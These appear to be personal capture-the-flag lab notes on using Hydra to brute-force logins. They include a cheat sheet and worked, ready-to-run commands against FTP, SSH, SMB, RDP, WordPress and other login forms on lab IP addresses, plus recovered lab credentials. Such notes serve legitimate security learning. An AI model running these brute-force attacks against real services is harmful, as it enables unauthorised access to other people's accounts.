<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hydra</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hydra</h1><br/><p><strong><h1>Hydra Password Bruteforce</h1></strong></p><p></p><p>What is Hydra?</p><p></p><p>Hydra is a brute force online password cracking program; a quick system login password &#39;hacking&#39; tool.</p><p></p><p>We can use Hydra to run through a list and &#39;bruteforce&#39; some authentication service. Imagine trying to manually guess someones password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.</p><p></p><p>Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.</p><p></p><p>For more information on the options of each protocol in Hydra, read the official Kali Hydra tool page: <strong><a href="https://en.kali.tools/?p=220">https://en.kali.tools/?p=220</a></strong> </p><p></p><p></p><p></p><p>Link: <strong><a href="https://github.com/vanhauser-thc/thc-hydra">https://github.com/vanhauser-thc/thc-hydra</a></strong></p><p>Link:<strong> </strong><strong><a href="https://github.com/gnebbia/hydra_notes">https://github.com/gnebbia/hydra_notes</a></strong> [Important Notes on <strong>HOW TO USE</strong>]</p><p></p><p>Hydra is a parallelized, fast and flexible login cracker.</p><p></p><p>hydra -l username -P wordlist.txt server service</p><p></p><p>-l : Username static</p><p>or</p><p>-L: Username wordlist</p><p></p><p>-p: Password static</p><p>or</p><p>-P: Password wordlist</p><p></p><p></p><p>server: It is the hostname or IP address of the target server.</p><p>service: It indicates the service which you are trying to launch the dictionary attack</p><p></p><p>-s PORT : To specify “non default” port number</p><p>-v	: Verbose</p><p>-vv : Very Verbose</p><p>-t N : Where N is the number of parallel connections to the target. eg. -t 16</p><p>-d : Debugging information</p><p></p><p>Note: -l ------&gt; Lowercase L</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Example FTP Login</span></strong></p><p><strong>Eg. hydra -l mark -P /usr/share/wordlists/rockyou.txt 10.10.117.110 ftp</strong></p><p><strong>or</strong></p><p><strong>hydra -l mark -P /usr/share/wordlists/rockyou.txt </strong><strong><a href="ftp://10.10.117.110">ftp://10.10.117.110</a></strong></p><p></p><p></p><p><strong>Live Example:</strong></p><p><em>hydra -l lazie -P /usr/share/wordlists/rockyou.txt -vv 10.10.117.110 imap</em></p><p></p><p><strong>Login Page (POST Method) Example:</strong></p><p><em>hydra -l &lt;username&gt; -P /usr/share/wordlists/&lt;wordlist&gt; &lt;ip&gt; http-post-form “Login URL excluding IP:Post method from Burp with cookie:Message”</em></p><p></p><p>eg.</p><p>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.229.129 http-post-form &quot;/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&quot; -vv</p><p></p><p><strong>Explanation</strong></p><p>-l --→ admin <strong>(Username)</strong></p><p>-P --→ /usr/share/wordlists/rockyou.txt <strong>(Password File)</strong></p><p>10.10.229.129 --→ <strong>(URL to attack)</strong></p><p>http-post-form --→ <strong>(Type of service)</strong></p><p>/Account/login.aspx?ReturnURL=/admin/ --→ <strong>(Variable Argument 1st field)</strong></p><p>__VIEWSTATE=75frL29Jq77UAS5O6waIAgvpqUOtcagLXmAs8ntJGK3DU6IXmkigWCYXlctGEb2O2G%2BjF5IteFOYg9pWj2Mqq0iJxVrJkUODXhUuOJ8sbmce0tBELKmw72s8I9JOUKGp6Z87DHYCwVZSIB1k8QZzxc%2BDfuwsKdSogudxveYfMl9Xl9WN&amp;__EVENTVALIDATION=kEqTpl3NK636vrrQoIGLwaBPeMNLrYgB5eLO2J3lhWCriHgdsDifHhxinhhtmfiV8p%2Fdx0IPiK0B5uO5gDR8tsJcKtQEVnqRqGuba%2BcImoxZrFAdTL%2FfNB4nBipBifGFewi7YAqZ8JhkThaZTfMnUpVOTH8tU0jzP03GuC7bHCt9G9K1&amp;ctl00%24MainContent%24LoginUser%24UserName=<em><strong>^USER^</strong></em>&amp;ctl00%24MainContent%24LoginUser%24Password=<em><strong>^PASS^</strong></em>&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in --→ <strong>(Variable Argument 2nd field)</strong></p><p>Login failed --→ <strong>(Variable Argument 3rd field)</strong> <strong>Note: </strong>We can also use <strong>F=login failed</strong> [To find that particular word to symbolize failure]</p><p>-vv --→ Verbose mode</p><p></p><p></p><p><strong>Note: Variable Arguments should be contained in quoatations and have 3 values seprated by “:”</strong> <strong>(All 3 Mandatory)</strong></p><p>Value 1 - Login URL excluding IP <em>[Can be easily recieved from Burpsuite]</em></p><p>Value 2 - Post Request with cookie information <em>[Can be easily recieved from Burpsuite]</em></p><p>Value 3 - The error message we get from a failed login [<em>Can be found on the web page after giving dummy</em>].</p><p></p><p><strong>Note:</strong></p><p>In the Post request remove the username and password we provided in burp with <strong>^USER^</strong> and <strong>^PASS^</strong></p><p></p><p><strong>Example Output:</strong></p><p></p><p></p><p><img src="images/83-1.png" alt="images/83-1.png" /></p><p></p><p><strong><h3>Hydra Cheatsheet:</h3></strong></p><p></p><p><table class="table"><tr><th>Command</th><th>Description</th></tr><tr><td>hydra -P &lt;wordlist&gt; -v &lt;ip&gt; &lt;protocol&gt;</td><td>Brute force against a protocol of your choice</td></tr><tr><td>hydra -v -V -u -L &lt;username list&gt; -P &lt;password list&gt; -t 1 -u &lt;ip&gt; &lt;protocol&gt;</td><td>You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)</td></tr><tr><td>hydra -t 1 -V -f -l &lt;username&gt; -P &lt;wordlist&gt; rdp://&lt;ip&gt;</td><td>Attack a Windows Remote Desktop with a password list.</td></tr><tr><td>hydra -l &lt;username&gt; -P .&lt;password list&gt; $ip -V http-form-post &#39;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#39;</td><td>Craft a more specific request for Hydra to brute force.</td></tr></table></p><p></p><p></p><p><strong><h3>Samba Example (Did not have sucess)</h3></strong></p><p></p><p>hydra -l milesdyson -P log1.txt 10.10.68.116 smb</p><p></p><p><img src="images/83-2.png" alt="images/83-2.png" /></p><p></p><p></p><p><strong><span style="text-decoration:underline;">Example SSH</span></strong></p><p></p><p><strong>hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.115.254 ssh -vV</strong></p><p></p><p><img src="images/83-3.png" alt="images/83-3.png" /></p><p><strong><h3>Example Post Form</h3></strong></p><p></p><p>hydra -l milesdyson -P log1.txt 10.10.68.116 http-post-form &quot;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:Unknown user or password incorrect.&quot; -vv</p><p></p><p><img src="images/83-4.png" alt="images/83-4.png" /></p><p></p><p></p><p><strong><h3>HTTP Post Brute-Force Example with Wordpress Login:</h3></strong></p><p></p><p>We will use <strong>hydra</strong> and <strong>dictionary file</strong> recieved to find out both <strong>username</strong> and <strong>password</strong>.</p><p></p><p>We capture the post request with burpsuite and collect the three important parameters.</p><p></p><p>1. Post Requester</p><p>2. Post Request</p><p>3. Error Message</p><p></p><p><strong>We get 1 and 2 below</strong></p><p><img src="images/83-5.png" alt="images/83-5.png" /></p><p><strong>We get 3 below</strong></p><p><img src="images/83-6.png" alt="images/83-6.png" /></p><p></p><p><strong>Hydra Code for finding out Username:</strong></p><p></p><p><em><strong>hydra -L /home/cybex/lab/thm/MrRobotCTF/fsocity.dic -p test -s 80 10.10.7.69 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.7.69%2Fwp-admin%2F&amp;testcookie=1:Invalid username&quot; -vv -t 64</strong></em></p><p></p><p><img src="images/83-7.png" alt="images/83-7.png" /></p><p></p><p>We found that <strong>Elliot</strong> is a valid username. This can be confirmed by using the above credentials in wordpress login. We will get a different error message.</p><p></p><p><img src="images/83-8.png" alt="images/83-8.png" /></p><p></p><p></p><p></p><p>keeping the 1 and 2 parameters same. We change the 3 parameter to the above error and following is the hydra code for password brute-force with Elliot as user.</p><p></p><p><strong>Hydra Code for finding out Password:</strong></p><p></p><p><em><strong>hydra -l Elliot -P /home/cybex/lab/thm/MrRobotCTF/fsocity.dic -s 80 10.10.7.69 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.7.69%2Fwp-admin%2F&amp;testcookie=1:The password you entered for the username&quot; -vv -t 64</strong></em></p><p></p><p><img src="images/83-9.png" alt="images/83-9.png" /></p><p></p><p></p><p><strong>Thus, we get the wordpress credentials:</strong></p><p><strong>Username: Elliot</strong></p><p><strong>Password: ER28-0652</strong></p><p></p><p></p><p></p><p><strong><h3>HTTP-GET request Brute Force Example:</h3></strong></p><p></p><p>Link:<strong> </strong><strong><a href="https://github.com/gnebbia/hydra_notes">https://github.com/gnebbia/hydra_notes</a></strong></p><p>I will use hydra to brute force http-get request. We can use any of the following syntax.</p><p></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-get /</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head</strong></p><p><strong>hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.230.171 http-head /</strong></p><p></p><p><img src="images/83-10.png" alt="images/83-10.png" /></p></div>
</body>
</html>
